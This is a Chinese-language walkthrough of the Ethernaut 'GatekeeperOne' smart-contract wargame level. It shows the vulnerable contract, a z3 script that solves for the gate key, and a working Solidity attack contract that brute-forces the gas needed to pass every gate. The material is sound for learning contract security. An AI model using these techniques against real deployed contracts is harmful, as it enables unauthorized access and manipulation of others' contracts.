# GateKeeper One


## 要求

```
越过守门人并且注册为一个参赛者来完成这一关.

这可能有帮助:
想一想你在 Telephone 和 Token 关卡学到的知识.
你可以在 solidity 文档中更深入的了解 gasleft() 函数 (参见 here 和 here).
```

## 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## 分析
这是目前碰到的最难的
首先:

```
modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```
`gateOne`这个函数就规定了，需要使用一个代理合约来调用。


然后:
```
modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

```
需要计算gasleft的值。开始搞迷糊了，这里不知道要怎么调用。后来看了几个文档，发现这个函数，在0.4.x的时候还叫`msg.gas`.那就是说这里的`gasleft()`其实计算的是发送者的`gas`.

现在就是要做的就是获取，进入到`enter`函数之前，消耗了多少的gas。
这个计算是真的不会，找了很多的解释，我自己也做了尝试，都不成功，直到后面看了下面这个视频
[Ethernaut靶场13关GatekeeperOne](https://www.bilibili.com/video/BV1214y1P7Gi) 才发现这个东西的影响因素很多，并不能说你计算的evm的gas是多少，实际的时候发起的就是多少，不知道metamask在这中间做了什么。有太多的不确定量。
因此还是对于`gateTwo`还是采用暴力破解吧。


```solidity
    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
```
输入是一个`bytes8 _gateKey` 8字节的变量。
- 条件一: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
这意味着 _gateKey 的低 32 位应该与其低 16 位相同。

- 条件二: `uint32(uint64(_gateKey)) != uint64(_gateKey)`
这意味着 _gateKey 的低 32 位应该与其整个 64 位不同。

- 条件三: `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`
这意味着 _gateKey 的低 32 位应该与 tx.origin 的低 16 位相同

直接使用z3来求解:
```python
from z3 import *

_gateKey = BitVec('_gateKey', 64)

tx_origin_value =   # 钱包实际的值

gateKey_32 = Extract(31, 0, _gateKey)

gatekey_16 = Extract(15,0,_gateKey)

con1 = gateKey_32 == ZeroExt(16,gatekey_16)

con2 = ZeroExt(32,gateKey_32) != _gateKey
tx_origin_16 = BitVecVal(tx_origin_value, 16)
con3 = gateKey_32 == ZeroExt(16,tx_origin_16)


solver = Solver()
solver.add(con1)
solver.add(con2)

solver.add(con3)
# 检查是否存在解
if solver.check() == sat:
    print("存在解")
    model = solver.model()
    print("_gateKey的值为:", model[_gateKey])
else:
    print("不存在解")
```

然后跑了一下，就跑出来解:
```
python ~/Downloads/z3sol.py
存在解
_gateKey的值为: 18446744069414640520

In [1]: hex(18446744069414640520)
Out[1]: '0xffffffff0000db88'

```

## pwn


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract GatekeeperOnePwn{
    address public  _target;
    event Log(bool);
    constructor(address target_){
        _target = target_;
    }
    
    function pwn()public {
        for(int i =0;i<500;i++){
            uint gas_value =uint(8191*5+i);
            bytes8 value = bytes8(0xffffffff0000db88);
            (bool suc,)=address(_target).call{gas:gas_value}(abi.encodeWithSignature("enter(bytes8)", value));
            if(suc){
                emit Log(true);
                break; 
            }
        }
        emit Log(false);
    }

}

```

成功！目前耗时最久的一关。